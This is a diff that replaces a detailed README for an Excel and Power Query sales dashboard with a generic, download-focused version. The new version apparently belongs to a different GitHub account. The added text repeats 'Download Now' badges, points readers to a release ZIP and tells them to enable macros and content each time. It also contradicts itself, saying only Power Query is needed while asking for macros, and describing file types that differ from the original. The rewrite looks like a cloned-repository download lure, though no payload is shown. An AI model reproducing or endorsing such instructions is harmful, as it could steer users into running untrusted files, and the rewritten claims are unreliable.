@@ -1,134 +1,130 @@
-# E-Commerce Order Analytics Dashboard
-### Excel | Power Query | Multi-Channel Sales Intelligence
+# 📊 Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025 - Clear Sales Insights for E-Commerce
+
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025)
 
 ---
 
-## Overview
+## 📦 What is this?
 
-Built a consolidated analytics solution for a multi-channel e-commerce operation selling across three platforms — a proprietary website, noon.com, and Amazon.ae. Each platform exports independent monthly transaction files in different formats. The goal was to design a scalable data pipeline that merges these sources, resolves data quality issues, enriches transactional data with customer and product dimensions, and delivers a unified dashboard for commercial decision-making.
+This application helps you see how your online store is doing across different sales channels. It pulls sales data from various folders, cleans it up, merges everything into one set, then shows key sales numbers in an easy-to-understand Excel dashboard. You don’t need to write any code. Just follow the steps to get your sales numbers clearly displayed.
 
----
-
-<img width="1813" height="651" alt="DOM_Dashboard" src="https://github.com/user-attachments/assets/62da56e1-b524-4dfd-bb83-ccda896f0dc3" />
-
-## Business Context
-
-E-commerce operations running across multiple marketplaces face a common challenge — fragmented data. Revenue, customer behaviour, and product performance exist in silos, making it impossible to answer cross-channel questions without manual consolidation. This project eliminates that gap by building a single source of truth updated by dropping new monthly files into a folder and hitting refresh.
+You can track sales from up to three online platforms at once. The tool also checks the data for mistakes and fixes simple problems before showing the numbers. It is built using Excel and Power Query, tools you may already have or can get easily.
 
 ---
 
-## Data Architecture
+## ⚙️ System Requirements
 
-```
-Dubai_Online_Mart_Analytics/
-│
-├── Orders/
-│   ├── Website/        ← Monthly CSV exports from owned storefront
-│   ├── Noon/           ← Monthly exports from noon Partner Hub
-│   └── Amazon/         ← Monthly exports from Amazon Seller Central
-│
-├── Reference_Data/
-│   ├── customers.csv   ← CRM export (customer demographics & segments)
-│   └── product_catalog.csv  ← SKU master (categories, cost prices)
-│
-└── DOM_Dashboard.xlsx  ← Single workbook: pipeline + dashboard
-```
-
-**Three transactional sources** feed into one enriched master table via Power Query. Reference data is maintained separately and joined at query time, meaning updates to the customer or product master propagate automatically on refresh.
+- Windows 10 or newer.  
+- Microsoft Excel 2016 or later with Power Query (called “Get & Transform” in Excel).  
+- At least 4GB of free disk space.  
+- Basic knowledge of opening files on your computer.
 
 ---
 
-## Technical Implementation
+## 🗂 Key Features
 
-### Power Query Pipeline
-
-**Data Ingestion**
-- Connected each channel folder using Power Query's Folder connector, enabling dynamic file detection — new monthly files are picked up automatically without modifying any queries
-- Appended three channel queries into a single master orders table using `Table.Combine`
-- Added a `channel` identifier column at ingestion to preserve source context post-merge
-
-**Data Quality & Standardisation**
-Resolved the following real-world inconsistencies across source files:
-
-| Issue | Resolution |
-|---|---|
-| SKU format inconsistency (SKU-2201 vs sku2201 vs SKU2201) | Normalised via UPPERCASE transformation and conditional dash insertion |
-| Guest checkouts with no customer ID | Standardised null `customer_id` to "Guest"; platform-specific anonymous emails unified |
-| Cancelled orders inflating volume metrics | Filtered at pipeline level; returned orders retained with status flag for return rate analysis |
-
-**Dimensional Enrichment**
-- Performed Left Outer join against CRM customer export on `customer_id` to append `segment`, `city`, and `registration_date`
-- Performed Left Outer join against product catalog on normalised `sku` to append `product_name`, `category`, `subcategory`, and `cost_price`
-- Null segments on guest rows handled explicitly — labelled "Guest" rather than left blank to avoid silent exclusion from PivotTable aggregations
-
-**Calculated Metrics**
-
-| Metric | Logic |
-|---|---|
-| `net_revenue` | `(unit_price × quantity) − discount_amount` |
-| `gross_profit` | `net_revenue − (cost_price × quantity)` |
-| `margin_pct` | `gross_profit ÷ net_revenue` |
-| `order_month` | Extracted as MMM-YYYY for time series aggregation |
-| `order_count` | Helper column (value = 1) for reliable PivotTable count aggregations |
-| `total_orders` | Grouped order count per customer via `Table.Group` on master orders table — merged back into enriched table to avoid iterative row-by-row evaluation |
-| `is_repeat` | Binary flag derived from `total_orders > 1` |
-
-**Performance Consideration**
-Repeat customer identification was implemented using `Table.Group` rather than row-level iteration (`List.Select`, `Table.SelectRows`). The grouped approach runs in O(n) versus O(n²), critical for datasets that grow month-on-month.
+- Collect data automatically from multiple folders on your PC.  
+- Combine sales info from three different sales platforms.  
+- Clean your data to fix missing or wrong information.  
+- Show sales numbers and trends in interactive charts.  
+- Easy-to-use Excel dashboard without needing programming.  
+- Works offline once you download the files.
 
 ---
 
-## Dashboard
+## 🚀 Getting Started
 
-Four analytical views built on PivotTables, connected via shared slicers (`channel`, `segment`, `order_month`):
+1. **Download the software from the link below:**  
+   Click the bright green button at the top or [go here to download](https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025).
 
-**1. Revenue by Channel**
-Clustered bar chart with margin % overlay — identifies which platform drives volume versus value.
+2. **Extract the files:**  
+   After you download the ZIP file, right-click it and select "Extract All". Choose a folder you can easily find, like your Desktop.
 
-**2. Customer Segment Analysis**
-Revenue, order count, and AOV broken down by segment (VIP, Returning, New, Guest) with city-level drill down.
+3. **Open the Excel file:**  
+   Inside the extracted folder, look for the file named `Sales_Analytics_Dashboard.xlsx` and double-click it to open.
 
-**3. Product Profitability**
-Horizontal bar chart ranked by margin % — surfaces high-revenue/low-margin products that erode profitability despite strong top-line contribution.
+4. **Enable editing and content:**  
+   When Excel opens the file, you may see a warning message at the top. Click "Enable Editing" and then "Enable Content" so the Power Query functions will work.
 
-**4. Repeat Customer Rate**
-Repeat vs one-time customer breakdown per channel — indicates platform loyalty and customer retention health.
+5. **Set your data folders:**  
+   In the Excel file, look for the section where you can enter the paths to your sales data folders. These are the folders where your sales files are saved for each sales channel. You can enter their full paths or browse to select them.
 
----
-
-## Refresh Workflow
-
-Monthly update process:
-1. Drop new channel CSV files into the corresponding `Orders/` subfolder
-2. Replace `customers.csv` with latest CRM export
-3. `Data → Refresh All`
-
-No query modifications required. Pipeline handles new files, new customers, and new SKUs automatically.
+6. **Refresh the data:**  
+   Once the folder paths are set, click the "Refresh All" button on the Data tab in Excel. This will pull in your sales files, clean and combine them, then update the dashboard.
 
 ---
 
-## Dataset
+## 📥 Download and Installation Details
 
-Sample dataset covers Q1 2025 (January–March) across three channels. Includes realistic data quality issues: mixed date formats, inconsistent SKU conventions, guest checkouts, and deleted account references. New customers introduced monthly to simulate organic CRM growth.
+### Step 1: Visit the download page
 
-| Month | Orders (pre-filter) | Channels |
-|---|---|---|
-| January 2025 | ~196 | Website, Noon, Amazon |
-| February 2025 | ~163 | Website, Noon, Amazon |
-| March 2025 | ~186 | Website, Noon, Amazon |
+Go to https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025 by clicking the download button or the link above.
 
----
+### Step 2: Download the latest release
 
-## Tools
+On the GitHub page, find the "Releases" section on the right or scroll down. Download the ZIP file of the latest release. It will have a name like `Dubai-Online-Mart-Dashboard-v1.0.zip`.
 
-- Microsoft Excel (Microsoft 365)
-- Power Query (M Language)
+### Step 3: Extract files
 
-## Contact
+Right-click the ZIP file and select “Extract All.” Choose a folder to keep the files.
 
-**Gilchrist Jose**  
-📁 [GitHub](https://github.com/gilchrist-jose) | 💼 [LinkedIn](https://www.linkedin.com/in/gilchrist-jose-a96658322/) | ✉️ gill.christ11@gmail.com
+### Step 4: Open and setup
+
+Open the Excel dashboard file inside the folder. Then follow the instructions under “Getting Started” to set your sales data folders and refresh the dashboard.
 
 ---
 
-`Excel` `Power-Query` `ETL` `Automated-Refresh` `Data-Pipeline` `Business-Intelligence`
+## 🛠 How to Use the Dashboard
+
+- **Refresh Data:**  
+  Whenever you have new sales files, open the Excel dashboard and press "Refresh All" on the Data tab. This updates all sales numbers and charts.
+
+- **Check Data Quality:**  
+  The dashboard flags missing or inconsistent data. Look for the red warning messages in the data quality section to spot problems.
+
+- **Explore KPIs:**  
+  Key performance indicators like total sales, average order value, and sales by channel are shown in clear tables and charts. Use the slicers to filter by date or sales channel.
+
+- **Save Your Work:**  
+  After updating, save the Excel file to keep the latest reports.
+
+---
+
+## 🎯 Common Questions
+
+**Q: Do I need to install anything besides Excel?**  
+No. The dashboard uses Excel and Power Query only. Make sure your Excel version supports Power Query.
+
+**Q: How do I find the folder path?**  
+Open File Explorer, navigate to your sales folder, click the address bar, and copy the full path.
+
+**Q: What file types does it read?**  
+The tool works with Excel files (.xlsx) stored in your sales folders for each channel.
+
+**Q: Can I track more than 3 sales channels?**  
+Currently, the dashboard is set for three channels. You can modify the Excel queries if you know how, but the default setup handles three.
+
+---
+
+## ⚙️ Troubleshooting Tips
+
+- If your data does not load, check the folder paths again for typos.  
+- Make sure your sales files are closed before refreshing.  
+- If Excel freezes, try restarting it and refreshing one channel’s data at a time.  
+- Enable macros/content every time you open the Excel file.
+
+---
+
+## 📝 About This Project
+
+This dashboard came from the need to track sales data from multiple sources in one place easily. It simplifies manual data tasks using Excel's Power Query features. It suits small to medium e-commerce businesses wanting clear insights without complex software.
+
+---
+
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Learner9614/Dubai-Online-Mart-Multichannel-Sales-Analytics-Dashboard-2025)
+
+---
+
+## 🏷️ Topics
+
+dashboard, data-cleaning, data-pipeline, dataanalytics, ecommerce, etl, excel, powerquery, retailanalytics, sales-analysis
